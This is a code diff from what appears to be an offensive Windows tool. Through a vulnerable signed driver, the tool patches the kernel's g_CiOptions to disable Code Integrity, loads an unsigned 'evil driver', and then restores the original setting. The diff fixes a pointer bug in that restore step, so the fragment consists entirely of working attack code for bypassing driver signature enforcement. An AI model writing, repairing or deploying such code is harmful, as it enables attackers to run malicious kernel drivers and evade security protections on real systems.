@@ -730,7 +730,7 @@ Other options:\n\
                                 }
                                 _putts_or_not(TEXT("[+] Using the vulnerable driver to disable CI..."));  // debug print
                                 ULONG CiOptionsValue=0;
-                                PULONG OldCiOptionsValue;
+                                ULONG OldCiOptionsValue;
                                 patch_gCiOptions(g_CiOptionsAddress, CiOptionsValue, &OldCiOptionsValue);
                                 LPTSTR evilServiceNameIfAny = NULL;
                                 BOOL isEvilDriverAlreadyRunning = IsDriverServiceRunning(unsignedDriverPath, &evilServiceNameIfAny);
@@ -745,7 +745,8 @@ Other options:\n\
                                         _putts_or_not(TEXT("[!] An error occurred while installing the evil driver"));
                                 }
                                 _putts_or_not(TEXT("[+] Using the vulnerable driver to reset original CI status"));  // debug print
-                                patch_gCiOptions(g_CiOptionsAddress, *OldCiOptionsValue, &OldCiOptionsValue);
+                                CiOptionsValue = OldCiOptionsValue;
+                                patch_gCiOptions(g_CiOptionsAddress, CiOptionsValue, &OldCiOptionsValue);
                             }
                         }
                         else {
